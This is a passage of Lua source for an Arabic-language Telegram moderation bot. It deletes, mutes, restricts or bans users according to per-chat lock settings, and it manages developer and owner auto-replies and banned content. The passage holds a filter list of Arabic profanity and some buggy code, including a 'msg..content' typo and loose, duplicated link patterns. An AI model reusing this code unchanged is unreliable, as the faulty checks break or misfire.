Num_Msg_FeLX = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") 
end
end
end
if msg.content.text then
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400
if string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then   
if redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
end
if msg.content.luatele == "messageUnsupported" then
if redis:get(bot_id..":"..msg.chat_id..":settings:messageSticker") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageSticker") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageSticker") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageSticker") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if redis:get(bot_id..":"..msg.chat_id..":settings:messageVideoNote") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageVideoNote") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageVideoNote") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageVideoNote") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if redis:get(bot_id..":"..msg.chat_id..":settings:messageAnimation") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageAnimation") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageAnimation") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageAnimation") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if redis:get(bot_id..":"..msg.chat_id..":settings:messageDocument") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageDocument") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageDocument") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageDocument") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if redis:get(bot_id..":"..msg.chat_id..":settings:messageVideo") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageVideo") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageVideo") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:messageVideo") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.content.luatele then
if redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if redis:get(bot_id..":"..msg.chat_id..":settings:messagePinMessage") then
UnPin = bot.unpinChatMessage(msg.chat_id)
if UnPin.luatele == "ok" then
bot.sendText(msg.chat_id,msg.id,"*‹ : التثبيت معطل من قبل المدراء .*","md",true)
end
end
if text and text:match("[a-zA-Z]") and not text:match("@[%a%d_]+") then
if redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end 
end
if (text and text:match("ی") or text and text:match('چ') or text and text:match('گ') or text and text:match('ک') or text and text:match('پ') or text and text:match('ژ') or text and text:match('ٔ') or text and text:match('۴') or text and text:match('۵') or text and text:match('۶') )then
if redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end 
end
if msg.content.text then
list = {"گواد","نيچ","كس","گس","عير","قواد","منيو","طيز","مصه","فروخ","تنح","مناوي","طوبز","عيور","ديس","نيج","دحب","نيك","فرخ","نيق","كواد","گحب","كحب","كواد","زب","عيري","كسي","كسختك","كسمك","زبي"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
if redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end 
end
end
if redis:get(bot_id..":"..msg.chat_id..":settings:message") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:message") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:message") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:message") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if msg.via_bot_user_id ~= 0 then
if redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.reply_markup and msg.reply_markup.luatele == "replyMarkupInlineKeyboard" then
if redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.content.entities and msg..content.entities[0] and msg.content.entities[0].type.luatele == "textEntityTypeUrl" then
if redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if text and text:match("/[%a%d_]+") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if text and text:match("@[%a%d_]+") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if text and text:match("#[%a%d_]+") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if (text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match("[Tt].[Mm][Ee]/") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]")) or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Tt][Kk]") or text and text:match(".[Mm][Ll]") or text and text:match(".[Oo][Rr][Gg]") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Links")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Links")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Links") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Links")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if devB(msg.sender.user_id) then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:set") == "true1" then
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
test = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:Text:rd")
if msg.content.video_note then
redis:set(bot_id.."Rp:all:content:Video_note:"..test, msg.content.video_note.video.remote.id)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
redis:set(bot_id.."Rp:all:content:Photo:"..test, idPhoto)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:all:content:Photo:caption:"..test, msg.content.caption.text)  
end
elseif msg.content.sticker then 
redis:set(bot_id.."Rp:all:content:Sticker:"..test, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then 
redis:set(bot_id.."Rp:all:content:VoiceNote:"..test, msg.content.voice_note.voice.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:all:content:VoiceNote:caption:"..test, msg.content.caption.text)  
end
elseif msg.content.video then 
redis:set(bot_id.."Rp:all:content:Video:"..test, msg.content.video.video.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:all:content:Video:caption:"..test, msg.content.caption.text)  
end
elseif msg.content.animation then 
redis:set(bot_id.."Rp:all:content:Animation:"..test, msg.content.animation.animation.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:all:content:Animation:caption:"..test, msg.content.caption.text)  
end
elseif msg.content.document then
redis:set(bot_id.."Rp:all:Manager:File:"..test, msg.content.document.document.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:all:Manager:File:caption:"..test, msg.content.caption.text)  
end
elseif msg.content.audio then
redis:set(bot_id.."Rp:all:content:Audio:"..test, msg.content.audio.audio.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:all:content:Audio:caption:"..test, msg.content.caption.text)  
end
elseif msg.content.text then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub("*","") 
redis:set(bot_id.."Rp:all:content:Text:"..test, text)  
end 
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:set")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:Text:rd")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ الرد العام بنجاح .*","md",true)
return false
end
end
if text and text:match("^(.*)$") and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:set") == "true" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:set","true1")
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:Text:rd",text)
redis:del(bot_id.."Rp:all:content:Text:"..text)   
redis:del(bot_id.."Rp:all:content:Sticker:"..text)     
redis:del(bot_id.."Rp:all:content:Animation:"..text)   
redis:del(bot_id.."Rp:all:content:Animation:caption:"..text)   
redis:del(bot_id.."Rp:all:content:VoiceNote:"..text)   
redis:del(bot_id.."Rp:all:content:VoiceNote:caption:"..text)   
redis:del(bot_id.."Rp:all:content:Photo:"..text)
redis:del(bot_id.."Rp:all:content:Photo:caption:"..text)
redis:del(bot_id.."Rp:all:content:Video:"..text)
redis:del(bot_id.."Rp:all:content:Video:caption:"..text)
redis:del(bot_id.."Rp:all:Manager:File:"..text)
redis:del(bot_id.."Rp:all:Manager:File:caption:"..text)
redis:del(bot_id.."Rp:all:content:Video_note:"..text)
redis:del(bot_id.."Rp:all:content:Video_note:caption:"..text)
redis:del(bot_id.."Rp:all:content:Audio:"..text)
redis:del(bot_id.."Rp:all:content:Audio:caption:"..text)
redis:sadd(bot_id.."List:Rp:all:content", text)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بارسال الرد العام .*","md",true)
return false
end
if text == "اضف رد عام" then
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الان الكلمه لاضافتها في ردود المطور .*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:set",true)
end
if text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:del") == "true" then
redis:del(bot_id.."Rp:all:content:Text:"..text)   
redis:del(bot_id.."Rp:all:content:Sticker:"..text)     
redis:del(bot_id.."Rp:all:content:Animation:"..text)   
redis:del(bot_id.."Rp:all:content:Animation:caption:"..text)   
redis:del(bot_id.."Rp:all:content:VoiceNote:"..text)   
redis:del(bot_id.."Rp:all:content:VoiceNote:caption:"..text)   
redis:del(bot_id.."Rp:all:content:Photo:"..text)
redis:del(bot_id.."Rp:all:content:Photo:caption:"..text)
redis:del(bot_id.."Rp:all:content:Video:"..text)
redis:del(bot_id.."Rp:all:content:Video:caption:"..text)
redis:del(bot_id.."Rp:all:Manager:File:"..text)
redis:del(bot_id.."Rp:all:Manager:File:caption:"..text)
redis:del(bot_id.."Rp:all:content:Video_note:"..text)
redis:del(bot_id.."Rp:all:content:Video_note:caption:"..text)
redis:del(bot_id.."Rp:all:content:Audio:"..text)
redis:del(bot_id.."Rp:all:content:Audio:caption:"..text)
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:del")
redis:srem(bot_id.."List:Rp:all:content",text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حذف الرد العام بنجاح .*","md",true)
end
end
if text == "حذف رد عام" then
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الان الكلمه لحذفها من ردود المطور .*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:all:del",true)
end
if text == ("ردود المطور") then
local list = redis:smembers(bot_id.."List:Rp:all:content")
ext = "‹ : قائمه ردود المطور .\n  ٴ— — — — — — — — — — \n"
for k,v in pairs(list) do
if redis:get(bot_id.."Rp:all:content:Animation:"..v) then
db = "متحركه 🎭"
elseif redis:get(bot_id.."Rp:all:content:VoiceNote:"..v) then
db = "بصمه 📢"
elseif redis:get(bot_id.."Rp:all:content:Sticker:"..v) then
db = "ملصق 🃏"
elseif redis:get(bot_id.."Rp:all:content:Text:"..v) then
db = "رساله ✉"
elseif redis:get(bot_id.."Rp:all:content:Photo:"..v) then
db = "صوره 🎇"
elseif redis:get(bot_id.."Rp:all:content:Video:"..v) then
db = "فيديو 📹"
elseif redis:get(bot_id.."Rp:all:Manager:File:"..v) then
db = "ملف • "
elseif redis:get(bot_id.."Rp:all:content:Audio:"..v) then
db = "اغنيه 🎵"
elseif redis:get(bot_id.."Rp:all:content:Video_note:"..v) then
db = "بصمه فيديو 🎥"
end
ext = ext..""..k.." -> "..v.." -> ("..db..")\n"
end
if #list == 0 then
ext = "‹ : عذرا لا يوجد ردود للمطور بالمجموعه ."
end
bot.sendText(msg.chat_id,msg.id,"["..ext.."]","md",true)  
end
if text == ("مسح ردود المطور") then
ext = "*‹ : تم مسح قائمه ردود المطور .*"
local list = redis:smembers(bot_id.."List:Rp:all:content")
for k,v in pairs(list) do
if redis:get(bot_id.."Rp:all:content:Animation:"..v) then
redis:del(bot_id.."Rp:all:content:Animation:"..v)
redis:del(bot_id.."Rp:all:content:Animation:caption:"..v)
elseif redis:get(bot_id.."Rp:all:content:Audio:"..v) then
redis:del(bot_id.."Rp:all:content:Audio:"..v)
redis:del(bot_id.."Rp:all:content:Audio:caption:"..v)
elseif redis:get(bot_id.."Rp:all:content:Video_note:"..v) then
redis:del(bot_id.."Rp:all:content:Video_note:"..v)
redis:del(bot_id.."Rp:all:content:Video_note:caption:"..v)
elseif redis:get(bot_id.."Rp:all:Manager:File:"..v) then
redis:del(bot_id.."Rp:all:Manager:File:"..v)
redis:del(bot_id.."Rp:all:Manager:File:caption:"..v)
elseif redis:get(bot_id.."Rp:all:content:Video:"..v) then
redis:del(bot_id.."Rp:all:content:Video:"..v)
redis:del(bot_id.."Rp:all:content:Video:caption:"..v)
elseif redis:get(bot_id.."Rp:all:content:Photo:"..v) then
redis:del(bot_id.."Rp:all:content:Photo:"..v)
redis:del(bot_id.."Rp:all:content:Photo:caption:"..v)
elseif redis:get(bot_id.."Rp:all:content:Text:"..v) then
redis:del(bot_id.."Rp:all:content:Text:"..v)
elseif redis:get(bot_id.."Rp:all:content:Sticker:"..v) then
redis:del(bot_id.."Rp:all:content:Sticker:"..v)
elseif redis:get(bot_id.."Rp:all:content:VoiceNote:"..v) then
redis:del(bot_id.."Rp:all:content:VoiceNote:"..v)
redis:del(bot_id.."Rp:all:content:VoiceNote:caption:"..v)
end
end
redis:del(bot_id.."List:Rp:all:content")
if #list == 0 then
ext = "*‹ : لا توجد ردود عامه مضافه .*"
end
bot.sendText(msg.chat_id,msg.id,ext,"md",true)  
end
end --- رد عام
if Owner(msg) then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":mn:set") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":mn:set")
if text or msg.content.sticker or msg.content.animation or msg.content.photo then
if msg.content.text then   
if redis:sismember(bot_id.."mn:content:Text"..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع الكلمه سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Text"..msg.chat_id, text)  
ty = "الرساله"
elseif msg.content.sticker then   
if redis:sismember(bot_id.."mn:content:Sticker"..msg.chat_id,msg.content.sticker.sticker.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع الملصق سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Sticker"..msg.chat_id, msg.content.sticker.sticker.remote.unique_id)  
ty = "الملصق"
elseif msg.content.animation then
if redis:sismember(bot_id.."mn:content:Animation"..msg.chat_id,msg.content.animation.animation.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع المتحركه سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Animation"..msg.chat_id, msg.content.animation.animation.remote.unique_id)  
ty = "المتحركه"
elseif msg.content.photo then
if redis:sismember(bot_id.."mn:content:Photo"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع الصوره سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Photo"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.unique_id)  
ty = "الصوره"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع "..ty.." بنجاح .*","md",true)  
return false
end
end
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set") == "true1" then
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
test = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rd")
if msg.content.video_note then
redis:set(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..test, msg.content.video_note.video.remote.id)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
redis:set(bot_id.."Rp:content:Photo"..msg.chat_id..":"..test, idPhoto)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
